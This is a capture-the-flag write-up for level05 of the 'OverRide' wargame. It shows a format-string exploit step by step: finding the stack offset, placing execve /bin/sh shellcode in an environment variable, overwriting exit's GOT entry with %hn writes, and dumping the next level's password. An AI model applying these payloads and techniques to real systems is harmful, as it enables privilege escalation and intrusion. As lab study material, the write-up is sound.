# we have fgets function, which stored the input on a buffer of 100 chars
# the code excute a while loop on the buffer and transform its characters to
# lowercase characters.
# and just before the exit function, we have a printf function with the buffer
# as parameter, so we can make a string format.
#
# let's find the position of the buffer on the stack
level05@OverRide:~$ for((i=0;i<200;i++));do echo "Index $i" && echo "AAAA%$i\$x" | ./level05 ; done | grep -B1 61616161
Index 10
aaaa61616161
# so position = 10
# next step consists on storing a shellcode in an env variable and injecting it at
# the 10th position of the format string
#
#Environnement variable : a shellcode
export exploit=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
#next
gdb-peda$ b *main+118
Breakpoint 1 at 0x80484ba
gdb-peda$ r
COUCOU
[...]
gdb-peda$ x/200s environ
[...]
0xffffdacf:	 "exploit
[...]
gdb-peda$ x/100i 0xffffdacf
   0xffffdacf:	gs
   0xffffdad0:	js     0xffffdb42
   0xffffdad2:	ins    BYTE PTR es:[edi],dx
   0xffffdad3:	outs   dx,DWORD PTR ds:[esi]
   0xffffdad4:	imul   esi,DWORD PTR [ebp+edi*1-0x70],0x90909090
   0xffffdadc:	nop
   0xffffdadd:	nop
   0xffffdade:	nop
   0xffffdadf:	nop
   0xffffdae0:	nop
   0xffffdae1:	nop
   0xffffdae2:	nop
   0xffffdae3:	nop <- we take this address
   0xffffdae4:	nop
   0xffffdae5:	nop
   0xffffdae6:	nop
   0xffffdae7:	nop
   0xffffdae8:	nop
   0xffffdae9:	nop
   0xffffdaea:	nop
   0xffffdaeb:	nop
   0xffffdaec:	nop
   0xffffdaed:	nop
   0xffffdaee:	nop
   0xffffdaef:	nop
   0xffffdaf0:	nop
   0xffffdaf1:	nop
   0xffffdaf2:	nop
   0xffffdaf3:	nop
   0xffffdaf4:	nop
   0xffffdaf5:	nop
   0xffffdaf6:	nop
   0xffffdaf7:	nop
   0xffffdaf8:	nop
   0xffffdaf9:	nop
   [...]
# we need now to overwrite the GOT address of exit
gdb-peda$ info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048370  exit
0x08048370  exit@plt
0xf7e5eb70  exit
[..]
gdb-peda$ x/i 0x08048370
   0x8048370 <exit@plt>:	jmp    DWORD PTR ds:0x80497e0 -> we take this address
# 0xffffdae3 = 4294957795 in decimal, very big number to write in 1 time
# so we write in two times
# dae3 = 56035(decimal), we have to substarct 8 to this number for our 2 addresses written before
# ffff = 65535(decimal)), we have to substract the number(56035) of all characters before
# payload
python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56027d"+"%10$hn"+"%9500d"+"%11$hn"' > /tmp/payload
level05@OverRide:~$ cat /tmp/payload - | ./level05
[...]
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
